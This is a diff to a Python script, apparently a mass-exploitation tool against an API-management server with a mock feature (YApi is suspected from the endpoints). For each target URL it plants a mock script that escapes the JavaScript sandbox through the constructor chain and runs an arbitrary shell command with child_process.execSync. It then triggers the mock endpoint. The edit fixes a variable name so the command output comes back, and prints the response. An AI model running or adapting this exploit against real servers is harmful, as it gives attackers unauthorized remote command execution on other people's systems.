@@ -62,7 +62,7 @@ for url in urls:
         #print("当前项目")
         #print(projid)
         data = {
-            "id":projid,"project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockjson = process.mainModule.require(\"child_process\").execSync(\""+cmd+"\").toString()","is_mock_open":True
+            "id":projid,"project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\""+cmd+"\").toString()","is_mock_open":True
         }
         up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
         #print(up)
@@ -72,7 +72,7 @@ for url in urls:
         api = requests.post(url+"/api/interface/add",headers=header,timeout=5,data=json.dumps(data)).json()
         #print(api)
         print(url+"/mock/"+str(projid)+"/"+id)
-        requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5)
+        print(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5))
     except:
         pass
 print(" payload发送完毕 ".center(50,"-"))
